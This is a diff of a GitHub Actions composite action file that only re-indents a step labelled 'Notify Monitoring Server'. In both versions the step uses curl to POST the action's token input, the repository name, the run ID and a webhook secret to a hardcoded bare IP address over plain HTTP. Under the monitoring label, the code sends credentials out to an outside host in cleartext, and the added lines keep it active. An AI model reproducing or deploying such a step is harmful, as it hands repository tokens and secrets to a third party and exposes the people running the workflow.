@@ -6,23 +6,22 @@ inputs:
         required: true
 runs:
     using: "composite"
-        steps:
-            - name: Notify Monitoring Server
-                shell: bash
-                run: |
-                    # Set variables
-                    RUN_ID=${{ github.event.workflow_run.id }}
-                    REPO="${{ github.repository }}"
-                    SERVER_URL="http://129.154.46.198:3000"
+    steps:
+        - name: Notify Monitoring Server
+          shell: bash
+          run: |
+              # Set variables
+              RUN_ID=${{ github.event.workflow_run.id }}
+              REPO="${{ github.repository }}"
+              SERVER_URL="http://129.154.46.198:3000"
+              TOKEN="${{ inputs.token }}"
 
-                    TOKEN="${{ inputs.token }}"
-
-                    # Notify server to start monitoring
-                    curl -X POST "$SERVER_URL/monitor" \
-                        -H "Content-Type: application/json" \
-                        -d "{
-                            \"run_id\": \"$RUN_ID\",
-                            \"token\": \"$TOKEN\",
-                            \"repository\": \"$REPO\",
-                            \"webhook_token\": \"$WEBHOOK_SECRET\"
-                        }"
+              # Notify server to start monitoring
+              curl -X POST "$SERVER_URL/monitor" \
+                  -H "Content-Type: application/json" \
+                  -d "{
+                      \"run_id\": \"$RUN_ID\",
+                      \"token\": \"$TOKEN\",
+                      \"repository\": \"$REPO\",
+                      \"webhook_token\": \"$WEBHOOK_SECRET\"
+                  }"
